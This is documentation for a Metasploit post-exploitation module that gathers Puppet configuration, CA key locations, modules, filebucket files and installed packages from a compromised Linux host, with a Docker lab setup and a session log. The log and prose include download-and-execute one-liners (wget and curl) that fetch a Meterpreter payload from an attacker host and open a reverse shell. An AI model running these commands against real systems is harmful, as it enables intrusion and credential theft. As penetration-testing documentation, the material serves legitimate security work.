## Vulnerable Application

This module will grab Puppet config files, credentials, host information, and file buckets

### Docker-compose Install

Use the puppet files located [here](https://github.com/voxpupuli/crafty/tree/main/puppet/oss) by following this script:

```
mkdir /tmp/puppet
wget https://raw.githubusercontent.com/voxpupuli/crafty/main/puppet/oss/.env -O /tmp/puppet/.env
wget https://raw.githubusercontent.com/voxpupuli/crafty/main/puppet/oss/compose.yaml -O /tmp/puppet/compose.yaml
docker-compose -f /tmp/puppet/compose.yaml up
```

Now build out some content so theres interesting things to pull:

```
docker exec -it puppet_puppet_1 /bin/bash
echo test >> /tmp/TestFile
puppet filebucket -l backup /tmp/TestFile

puppet module install puppetlabs-apache
```

## Verification Steps

1. Install the application
1. Start msfconsole
1. Get an initial shell on the box
1. Do: `use post/linux/gather/puppet`
1. Do: `set session [#]`
1. Do: `run`
1. You should get information about the puppet install and host.

## Options

### FILEBUCKET

If file bucket items should be pulled. Defaults to `true`

### PUPPET

Location of puppet executable if not in a standard location. This is added to a list of default locations
which includes `/opt/puppetlabs/puppet/bin/puppet`.

### FACTER

Location of facter executable if not in a standard location. This is added to a list of default locations
which includes `/opt/puppetlabs/puppet/bin/facter`.

## Scenarios

### Docker compose as mentioned above

Get initial access to the system

```
resource (puppet.rb)> use exploit/multi/script/web_delivery
[*] Using configured payload python/meterpreter/reverse_tcp
resource (puppet.rb)> set lhost 1.1.1.1
lhost => 1.1.1.1
resource (puppet.rb)> set srvport 8181
srvport => 8181
resource (puppet.rb)> set target 7
target => 7
resource (puppet.rb)> set payload payload/linux/x64/meterpreter/reverse_tcp
payload => linux/x64/meterpreter/reverse_tcp
resource (puppet.rb)> run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 1.1.1.1:4444 
[*] Using URL: http://1.1.1.1:8181/Gc7zrm8CdKGSe2
[*] Server started.
[*] Run the following command on the target machine:
wget -qO CmKyTd1N --no-check-certificate http://1.1.1.1:8181/Gc7zrm8CdKGSe2; chmod +x CmKyTd1N; ./CmKyTd1N& disown
[*] Sending stage (3045380 bytes) to 172.20.0.3
[msf](Jobs:1 Agents:0) post(linux/gather/puppet) > [*] Meterpreter session 1 opened (1.1.1.1:4444 -> 172.20.0.3:59338) at 2023-12-10 10:38:11 -0500
```

We now have a `wget` command, however the system doesn't have `wget`. Alter it to a `curl`
command similar to `curl http://1.1.1.1:8181/Gc7zrm8CdKGSe2 > uBgZi2eZ; chmod +x uBgZi2eZ; ./uBgZi2eZ& disown`

You'll now need to get on the docker image: `docker exec -it puppet_puppet_1 /bin/bash` and run the `curl`` command.

```
resource (puppet.rb)> use post/linux/gather/puppet
resource (puppet.rb)> set session 1
resource (puppet.rb)> set verbose true
verbose => true
[msf](Jobs:1 Agents:1) post(linux/gather/puppet) > run

[+] Stored puppet config to: /root/.msf4/loot/20231210104539_default_172.20.0.3_puppet.conf_250032.txt
[+] Puppet Configuration
====================

 Parameter  Value                                        Loot Location
 ---------  -----                                        -------------
 cacert     /etc/puppetlabs/puppetserver/ca/ca_crt.pem   /root/.msf4/loot/20231210104540_default_172.20.0.3_etcpuppetlabs_837639.txt
 cakey      /etc/puppetlabs/puppetserver/ca/ca_key.pem   /root/.msf4/loot/20231210104540_default_172.20.0.3_etcpuppetlabs_098956.txt
 passfile   /etc/puppetlabs/puppet/ssl/private/password
 server     puppet
 user       puppet

[+] Puppet Modules
==============

 Module             Version
 ------             -------
 puppetlabs-apache  v11.1.0
 puppetlabs-concat  v9.0.1
 puppetlabs-stdlib  v9.4.1

[*] Retrieving filebucket contents: /tmp/TestFile
[+] Puppet Filebucket Files
=======================

 Hash                                                              Date                 Filename       Loot location
 ----                                                              ----                 --------       -------------
 9252a75c942da16f7b52cab752797dea4fca18474db9d7eff102842a459b25b3  2023-12-09 12:17:58  /tmp/TestFile  /root/.msf4/loot/20231210104544_default_172.20.0.3_puppet.filebucke_189638.txt

[+] Stored facter to: /root/.msf4/loot/20231210104545_default_172.20.0.3_puppet.facter_436612.txt
[+] Stored packages to: /root/.msf4/loot/20231210104547_default_172.20.0.3_puppet.packages_320990.txt
[+] Puppet Packages
===============

 Package                   Version                                  Source
 -------                   -------                                  ------
 adduser                   3.118ubuntu5                             apt
 apt                       2.4.10                                   apt
 base-files                12ubuntu4.4                              apt
 base-passwd               3.5.52build1                             apt
 base64                    0.2.0                                    puppet_gem
 bash                      5.1-6ubuntu1                             apt
 benchmark                 0.1.0                                    puppet_gem
 bigdecimal                2.0.0                                    puppet_gem
 bsdutils                  1:2.37.2-4ubuntu3                        apt
 bundler                   2.1.4                                    puppet_gem
 ca-certificates           20230311ubuntu0.22.04.1                  apt
 ca-certificates-java      20190909ubuntu1.2                        apt
 cgi                       0.1.0.2                                  puppet_gem
 colored2                  3.1.2                                    puppet_gem
 concurrent-ruby           1.1.9                                    puppet_gem
 coreutils                 8.32-4.1ubuntu1                          apt
 cri                       2.15.11                                  puppet_gem
 csv                       3.1.2                                    puppet_gem
 dash                      0.5.11+git20210903+057cd650a4ed-3build1  apt
 date                      3.0.3                                    puppet_gem
 debconf                   1.5.79ubuntu1                            apt
 debianutils               5.5-1ubuntu2                             apt
 deep_merge                1.2.2                                    puppet_gem
 delegate                  0.1.0                                    puppet_gem
 did_you_mean              1.4.0                                    puppet_gem
 diffutils                 1:3.8-0ubuntu2                           apt
 dpkg                      1.21.1ubuntu2.2                          apt
 dumb-init                 1.2.5                                    apt
 e2fsprogs                 1.46.5-2ubuntu1.1                        apt
 erubi                     1.12.0                                   puppet_gem
 etc                       1.1.0                                    puppet_gem
 facter                    4.5.1                                    puppet_gem
 faraday                   2.7.11                                   puppet_gem
 faraday-follow_redirects  0.3.0                                    puppet_gem
 faraday-net_http          3.0.2                                    puppet_gem
 fast_gettext              2.3.0                                    puppet_gem
 fcntl                     1.0.0                                    puppet_gem
 ffi                       1.15.5                                   puppet_gem
 fiddle                    1.0.0                                    puppet_gem
 fileutils                 1.4.1                                    puppet_gem
 findutils                 4.8.0-1ubuntu3                           apt
 fontconfig-config         2.13.1-4.2ubuntu5                        apt
 fonts-dejavu-core         2.37-2build1                             apt
 forwardable               1.3.1                                    puppet_gem
 gcc-12-base               12.3.0-1ubuntu1~22.04                    apt
 getoptlong                0.1.0                                    puppet_gem
 gettext                   3.4.9                                    puppet_gem
 gettext-setup             1.1.0                                    puppet_gem
 git                       1:2.34.1-1ubuntu1.10                     apt
 git-man                   1:2.34.1-1ubuntu1.10                     apt
 gpgv                      2.2.27-3ubuntu2.1                        apt
 grep                      3.7-1build1                              apt
 gzip                      1.10-4ubuntu4.1                          apt
 hiera                     3.12.0                                   puppet_gem
 hiera-eyaml               3.4.0                                    puppet_gem
 highline                  2.1.0                                    puppet_gem
 hocon                     1.3.1                                    puppet_gem
 hostname                  3.23ubuntu2                              apt
 init-system-helpers       1.62                                     apt
 io-console                0.5.6                                    puppet_gem
 ipaddr                    1.2.2                                    puppet_gem
 irb                       1.2.6                                    puppet_gem
 java-common               0.72build2                               apt
 json                      2.3.0                                    puppet_gem
 jwt                       2.7.1                                    puppet_gem
 libacl1                   2.3.1-1                                  apt
 libapt-pkg6.0             2.4.10                                   apt
 libasound2                1.2.6.1-1ubuntu1                         apt
 libasound2-data           1.2.6.1-1ubuntu1                         apt
 libattr1                  1:2.5.1-1build1                          apt
 libaudit-common           1:3.0.7-1build1                          apt
 libaudit1                 1:3.0.7-1build1                          apt
 libavahi-client3          0.8-5ubuntu5.1                           apt
 libavahi-common-data      0.8-5ubuntu5.1                           apt
 libavahi-common3          0.8-5ubuntu5.1                           apt
 libblkid1                 2.37.2-4ubuntu3                          apt
 libbrotli1                1.0.9-2build6                            apt
 libbsd0                   0.11.5-1                                 apt
 libbz2-1.0                1.0.8-5build1                            apt
 libc-bin                  2.35-0ubuntu3.4                          apt
 libc6                     2.35-0ubuntu3.4                          apt
 libcap-ng0                0.7.9-2.2build3                          apt
 libcap2                   1:2.44-1ubuntu0.22.04.1                  apt
 libcom-err2               1.46.5-2ubuntu1.1                        apt
 libcrypt1                 1:4.4.27-1                               apt
 libcups2                  2.4.1op1-1ubuntu4.7                      apt
 libcurl3-gnutls           7.81.0-1ubuntu1.14                       apt
 libdb5.3                  5.3.28+dfsg1-0.8ubuntu3                  apt
 libdbus-1-3               1.12.20-2ubuntu4.1                       apt
 libdebconfclient0         0.261ubuntu1                             apt
 liberror-perl             0.17029-1                                apt
 libexpat1                 2.4.7-1ubuntu0.2                         apt
 libext2fs2                1.46.5-2ubuntu1.1                        apt
 libffi8                   3.4.2-4                                  apt
 libfontconfig1            2.13.1-4.2ubuntu5                        apt
 libfreetype6              2.11.1+dfsg-1ubuntu0.2                   apt
 libgcc-s1                 12.3.0-1ubuntu1~22.04                    apt
 libgcrypt20               1.9.4-3ubuntu3                           apt
 libgdbm-compat4           1.23-1                                   apt
 libgdbm6                  1.23-1                                   apt
 libglib2.0-0              2.72.4-0ubuntu2.2                        apt
 libgmp10                  2:6.2.1+dfsg-3ubuntu1                    apt
 libgnutls30               3.7.3-4ubuntu1.2                         apt
 libgpg-error0             1.43-3                                   apt
 libgraphite2-3            1.3.14-1build2                           apt
 libgssapi-krb5-2          1.19.2-2ubuntu0.2                        apt
 libharfbuzz0b             2.7.4-1ubuntu3.1                         apt
 libhogweed6               3.7.3-1build2                            apt
 libidn2-0                 2.3.2-2build1                            apt
 libjpeg-turbo8            2.1.2-0ubuntu1                           apt
 libjpeg8                  8c-2ubuntu10                             apt
 libk5crypto3              1.19.2-2ubuntu0.2                        apt
 libkeyutils1              1.6.1-2ubuntu3                           apt
 libkrb5-3                 1.19.2-2ubuntu0.2                        apt
 libkrb5support0           1.19.2-2ubuntu0.2                        apt
 liblcms2-2                2.12~rc1-2build2                         apt
 libldap-2.5-0             2.5.16+dfsg-0ubuntu0.22.04.1             apt
 liblz4-1                  1.9.3-2build2                            apt
 liblzma5                  5.2.5-2ubuntu1                           apt
 libmd0                    1.0.4-1build1                            apt
 libmount1                 2.37.2-4ubuntu3                          apt
 libncurses6               6.3-2ubuntu0.1                           apt
 libncursesw6              6.3-2ubuntu0.1                           apt
 libnettle8                3.7.3-1build2                            apt
 libnghttp2-14             1.43.0-1build3                           apt
 libnsl2                   1.3.0-2build2                            apt
 libnspr4                  2:4.32-3build1                           apt
 libnss3                   2:3.68.2-0ubuntu1.2                      apt
 libp11-kit0               0.24.0-6build1                           apt
 libpam-modules            1.4.0-11ubuntu2.3                        apt
 libpam-modules-bin        1.4.0-11ubuntu2.3                        apt
 libpam-runtime            1.4.0-11ubuntu2.3                        apt
 libpam0g                  1.4.0-11ubuntu2.3                        apt
 libpcre2-8-0              10.39-3ubuntu0.1                         apt
 libpcre3                  2:8.39-13ubuntu0.22.04.1                 apt
 libpcsclite1              1.9.5-3ubuntu1                           apt
 libperl5.34               5.34.0-3ubuntu1.2                        apt
 libpng16-16               1.6.37-3build5                           apt
 libprocps8                2:3.3.17-6ubuntu2                        apt
 libpsl5                   0.21.0-1.2build2                         apt
 librtmp1                  2.4+20151223.gitfa8646d.1-2build4        apt
 libsasl2-2                2.1.27+dfsg2-3ubuntu1.2                  apt
 libsasl2-modules-db       2.1.27+dfsg2-3ubuntu1.2                  apt
 libseccomp2               2.5.3-2ubuntu2                           apt
 libselinux1               3.3-1build2                              apt
 libsemanage-common        3.3-1build2                              apt
 libsemanage2              3.3-1build2                              apt
 libsepol2                 3.3-1build1                              apt
 libsmartcols1             2.37.2-4ubuntu3                          apt
 libsqlite3-0              3.37.2-2ubuntu0.1                        apt
 libss2                    1.46.5-2ubuntu1.1                        apt
 libssh-4                  0.9.6-2ubuntu0.22.04.1                   apt
 libssl3                   3.0.2-0ubuntu1.10                        apt
 libstdc++6                12.3.0-1ubuntu1~22.04                    apt
 libsystemd0               249.11-0ubuntu3.10                       apt
 libtasn1-6                4.18.0-4build1                           apt
 libtinfo6                 6.3-2ubuntu0.1                           apt
 libtirpc-common           1.3.2-2ubuntu0.1                         apt
 libtirpc3                 1.3.2-2ubuntu0.1                         apt
 libudev1                  249.11-0ubuntu3.10                       apt
 libunistring2             1.0-1                                    apt
 libuuid1                  2.37.2-4ubuntu3                          apt
 libx11-6                  2:1.7.5-1ubuntu0.3                       apt
 libx11-data               2:1.7.5-1ubuntu0.3                       apt
 libxau6                   1:1.0.9-1build5                          apt
 libxcb1                   1.14-3ubuntu3                            apt
 libxdmcp6                 1:1.1.3-0ubuntu5                         apt
 libxext6                  2:1.3.4-1build1                          apt
 libxi6                    2:1.8-1build1                            apt
 libxrender1               1:0.9.10-1build4                         apt
 libxtst6                  2:1.2.3-1build4                          apt
 libxxhash0                0.8.1-1                                  apt
 libzstd1                  1.4.8+dfsg-3build1                       apt
 locale                    2.1.3                                    puppet_gem
 log4r                     1.1.10                                   puppet_gem
 logger                    1.4.2                                    puppet_gem
 login                     1:4.8.1-2ubuntu2.1                       apt
 logsave                   1.46.5-2ubuntu1.1                        apt
 lsb-base                  11.1.0ubuntu4                            apt
 matrix                    0.2.0                                    puppet_gem
 mawk                      1.3.4.20200120-3                         apt
 minitar                   0.9                                      puppet_gem
 minitest                  5.13.0                                   puppet_gem
 mount                     2.37.2-4ubuntu3                          apt
 multi_json                1.15.0                                   puppet_gem
 mutex_m                   0.1.0                                    puppet_gem
 ncurses-base              6.3-2ubuntu0.1                           apt
 ncurses-bin               6.3-2ubuntu0.1                           apt
 net-pop                   0.1.0                                    puppet_gem
 net-smtp                  0.1.0                                    puppet_gem
 net-ssh                   4.2.0                                    puppet_gem
 net-telnet                0.2.0                                    puppet_gem
 net-tools                 1.60+git20181103.0eebece-1ubuntu5        apt
 netbase                   6.3                                      apt
 observer                  0.1.0                                    puppet_gem
 open3                     0.1.0                                    puppet_gem
 openjdk-17-jre-headless   17.0.8.1+1~us1-0ubuntu1~22.04            apt
 openjdk-8-jre-headless    8u382-ga-1~22.04.1                       apt
 openssl                   3.0.2-0ubuntu1.12                        apt
 optimist                  3.0.1                                    puppet_gem
 ostruct                   0.2.0                                    puppet_gem
 passwd                    1:4.8.1-2ubuntu2.1                       apt
 perl                      5.34.0-3ubuntu1.2                        apt
 perl-base                 5.34.0-3ubuntu1.2                        apt
 perl-modules-5.34         5.34.0-3ubuntu1.2                        apt
 power_assert              1.1.7                                    puppet_gem
 prime                     0.1.1                                    puppet_gem
 procps                    2:3.3.17-6ubuntu2                        apt
 pstore                    0.1.0                                    puppet_gem
 psych                     3.1.0                                    puppet_gem
 puppet                    7.27.0                                   puppet_gem
 puppet-agent              7.27.0-1jammy                            apt
 puppet-resource_api       1.9.0                                    puppet_gem
 puppet7-release           7.0.0-14jammy                            apt
 puppet_forge              5.0.3                                    puppet_gem
 puppetdb-termini          7.15.0-1jammy                            apt
 puppetserver              7.14.0-1jammy                            apt
 puppetserver-ca           2.6.0                                    puppet_gem
 r10k                      4.0.0                                    puppet_gem
 racc                      1.4.16                                   puppet_gem
 rake                      13.0.1                                   puppet_gem
 rdoc                      6.2.1.1                                  puppet_gem
 readline                  0.0.2                                    puppet_gem
 readline-ext              0.1.0                                    puppet_gem
 reline                    0.1.5                                    puppet_gem
 rexml                     3.2.3.1                                  puppet_gem
 rss                       0.2.8                                    puppet_gem
 ruby2_keywords            0.0.5                                    puppet_gem
 scanf                     1.0.0                                    puppet_gem
 sdbm                      1.0.0                                    puppet_gem
 sed                       4.8-1ubuntu2                             apt
 semantic_puppet           1.0.4                                    puppet_gem
 sensible-utils            0.0.17                                   apt
 singleton                 0.1.0                                    puppet_gem
 stringio                  0.1.0                                    puppet_gem
 strscan                   1.0.3                                    puppet_gem
 sys-filesystem            1.4.4                                    puppet_gem
 sysvinit-utils            3.01-1ubuntu1                            apt
 tar                       1.34+dfsg-1ubuntu0.1.22.04.1             apt
 test-unit                 3.3.4                                    puppet_gem
 text                      1.3.1                                    puppet_gem
 thor                      1.2.2                                    puppet_gem
 timeout                   0.1.0                                    puppet_gem
 tracer                    0.1.0                                    puppet_gem
 ubuntu-keyring            2021.03.26                               apt
 ucf                       3.0043                                   apt
 uri                       0.10.0.2                                 puppet_gem
 usrmerge                  25ubuntu2                                apt
 util-linux                2.37.2-4ubuntu3                          apt
 webrick                   1.6.1                                    puppet_gem
 x11-common                1:7.7+23ubuntu2                          apt
 xmlrpc                    0.3.0                                    puppet_gem
 yaml                      0.1.0                                    puppet_gem
 zlib                      1.1.0                                    puppet_gem
 zlib1g                    1:1.2.11.dfsg-2ubuntu9.2                 apt

[*] Post module execution completed
```
